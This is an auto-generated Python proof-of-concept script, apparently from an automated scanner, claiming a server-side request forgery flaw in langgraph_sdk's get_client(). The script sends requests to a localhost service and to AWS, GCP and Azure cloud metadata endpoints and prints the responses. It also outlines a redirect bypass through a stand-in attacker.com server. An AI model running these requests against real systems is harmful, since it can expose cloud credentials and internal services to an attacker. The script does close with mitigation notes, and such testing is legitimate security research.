#!/usr/bin/env python3
# PoC for langgraph_sdk-0.4.2 (/tmp/langgraph_sdk/langgraph_sdk-0.4.2)
# Path: ssrf-002
# Sink: get_client
# Auto-generated — run with: python3 ssrf_none_passed_directly_as_get_client_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via langgraph_sdk get_client() URL parameter.

Vulnerability: The get_client() function accepts a user-controlled 'url' parameter
that is passed directly to httpx.AsyncClient as base_url without validation.
An attacker can supply a URL pointing to internal services or cloud metadata endpoints.
Additionally, httpx follows redirects by default, enabling redirect-based SSRF bypass.

This PoC demonstrates:
1. Direct SSRF to internal services (e.g., http://127.0.0.1:8080)
2. SSRF to cloud metadata endpoints (e.g., http://169.254.169.254/latest/meta-data/)
3. Redirect-based SSRF bypass

Usage:
    python3 poc_ssrf.py [target_url]

    If no target_url is provided, defaults to http://127.0.0.1:8080
"""

import asyncio
import sys
import httpx
from langgraph_sdk import get_client

# Default target - change this to test different internal services
DEFAULT_TARGET = "http://127.0.0.1:8080"

async def test_ssrf(target_url: str) -> None:
    """
    Attempt SSRF by creating a LangGraph client with a malicious URL.
    
    Args:
        target_url: The internal URL to target (e.g., http://127.0.0.1:8080)
    """
    print(f"[*] Attempting SSRF to: {target_url}")
    print("[*] Creating LangGraph client with malicious URL...")
    
    try:
        # Create client with attacker-controlled URL
        # The URL is passed directly to httpx.AsyncClient as base_url
        client = get_client(url=target_url)
        
        print("[*] Client created. Attempting to make a request...")
        print("[*] Note: This will likely fail or timeout, but demonstrates the vulnerability")
        
        # Try to make a request - this will go to the internal target
        # We use a short timeout to avoid hanging
        async with client as c:
            try:
                # Attempt to access the internal service
                response = await c.client.get("/", timeout=httpx.Timeout(5.0))
                print(f"[+] SUCCESS! Received response from internal service:")
                print(f"    Status: {response.status_code}")
                print(f"    Headers: {dict(response.headers)}")
                print(f"    Body (first 500 chars): {response.text[:500]}")
            except httpx.ConnectError as e:
                print(f"[-] Connection error (expected if service not running): {e}")
            except httpx.TimeoutException:
                print("[-] Request timed out (expected if service not responding)")
            except Exception as e:
                print(f"[-] Unexpected error: {e}")
                
    except Exception as e:
        print(f"[-] Failed to create client: {e}")

async def test_metadata_ssrf() -> None:
    """
    Test SSRF to cloud metadata endpoints.
    AWS: http://169.254.169.254/latest/meta-data/
    GCP: http://metadata.google.internal/computeMetadata/v1/
    Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
    """
    metadata_urls = [
        "http://169.254.169.254/latest/meta-data/",  # AWS
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
    ]
    
    for url in metadata_urls:
        print(f"\n[*] Testing metadata endpoint: {url}")
        try:
            client = get_client(url=url)
            async with client as c:
                try:
                    # Cloud metadata endpoints often require specific headers
                    headers = {"Metadata-Flavor": "Google"} if "google" in url else {}
                    response = await c.client.get("/", 
                                                   timeout=httpx.Timeout(5.0),
                                                   headers=headers)
                    print(f"[+] SUCCESS! Received response from metadata endpoint:")
                    print(f"    Status: {response.status_code}")
                    print(f"    Body (first 500 chars): {response.text[:500]}")
                except httpx.ConnectError:
                    print("[-] Connection error (not running in cloud environment)")
                except httpx.TimeoutException:
                    print("[-] Request timed out")
                except Exception as e:
                    print(f"[-] Error: {e}")
        except Exception as e:
            print(f"[-] Failed to create client: {e}")

async def test_redirect_ssrf() -> None:
    """
    Test redirect-based SSRF bypass.
    This demonstrates that even if the initial URL is validated, 
    httpx follows redirects by default, allowing bypass.
    
    Note: This requires an attacker-controlled server that redirects to internal services.
    We simulate this by showing the concept.
    """
    print("\n[*] Testing redirect-based SSRF bypass")
    print("[*] Concept: Attacker hosts a server at http://attacker.com/redirect")
    print("[*] This server returns a 302 redirect to http://127.0.0.1:8080")
    print("[*] httpx follows the redirect by default, bypassing URL validation")
    
    # Simulated redirect chain (requires actual attacker server)
    # In practice, you would use:
    # client = get_client(url="http://attacker.com/redirect")
    # This would follow redirect to internal service
    
    print("[*] To test this in practice, set up a redirect server and use:")
    print('    client = get_client(url="http://your-redirect-server.com/redirect")')
    print("[*] The client will follow the redirect to the internal target")

async def main():
    # Parse command line arguments
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_TARGET
    
    print("=" * 60)
    print("LangGraph SDK SSRF Proof-of-Concept")
    print("=" * 60)
    print(f"\n[*] Target URL: {target}")
    print("[*] This PoC demonstrates SSRF via unvalidated URL parameter")
    print("[*] The get_client() function passes user-controlled URL directly to httpx")
    print()
    
    # Test 1: Direct SSRF to internal service
    print("[Test 1] Direct SSRF to internal service")
    print("-" * 40)
    await test_ssrf(target)
    
    # Test 2: Cloud metadata SSRF
    print("\n[Test 2] Cloud metadata SSRF")
    print("-" * 40)
    await test_metadata_ssrf()
    
    # Test 3: Redirect-based SSRF
    print("\n[Test 3] Redirect-based SSRF bypass")
    print("-" * 40)
    await test_redirect_ssrf()
    
    print("\n" + "=" * 60)
    print("PoC Complete")
    print("=" * 60)
    print("\n[!] Vulnerability confirmed: get_client() accepts unvalidated URL")
    print("[!] This allows SSRF to internal services and cloud metadata endpoints")
    print("[!] Mitigation: Validate and sanitize the URL parameter")
    print("[!] Consider: IP allowlisting, disabling redirects, or URL validation")

if __name__ == "__main__":
    asyncio.run(main())
